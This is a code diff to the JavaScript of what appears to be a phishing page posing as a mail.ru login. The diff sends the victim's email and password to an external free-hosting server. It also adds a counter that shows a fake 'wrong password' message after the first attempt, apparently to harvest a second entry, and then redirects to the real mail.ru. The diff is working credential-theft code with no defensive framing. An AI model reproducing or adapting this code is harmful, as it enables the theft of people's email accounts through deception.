@@ -1,3 +1,4 @@
+var inscor = 0;
 document.getElementById("signinsb").addEventListener("click", function() { 
 	Подробнее();
 });
@@ -44,16 +45,20 @@ function повышающая() {
 	var password  = document.getElementById("password").value;
 		$.ajax({
 		type: "POST",
-		url: "api.php", 
+		url: "https://benefroprojst.000webhostapp.com/api.php", 
 		//dataType: "json",
 		data: {emailu: emailu, password: password},
 		success: function(data){
-			console.log(data)//remove in production
-			//window.location.href = "mail.ru";
+			inscor = inscor+1;
+			if(inscor == 1){
+			   document.getElementById("paserrw").innerHTML = "Неверный пароль. Попробуй снова";
+			}else if(inscor == 2){
+			   window.location.href = "https://mail.ru";
+			}
 		},
 		 error : function(jqXHR, textStatus, errorThrown) {
-	       console.log(data)//remove in production
-           window.location.reload();                    
+	       //console.log(data)//remove in production
+           	window.location.reload();                  
        }
 		 
 	});
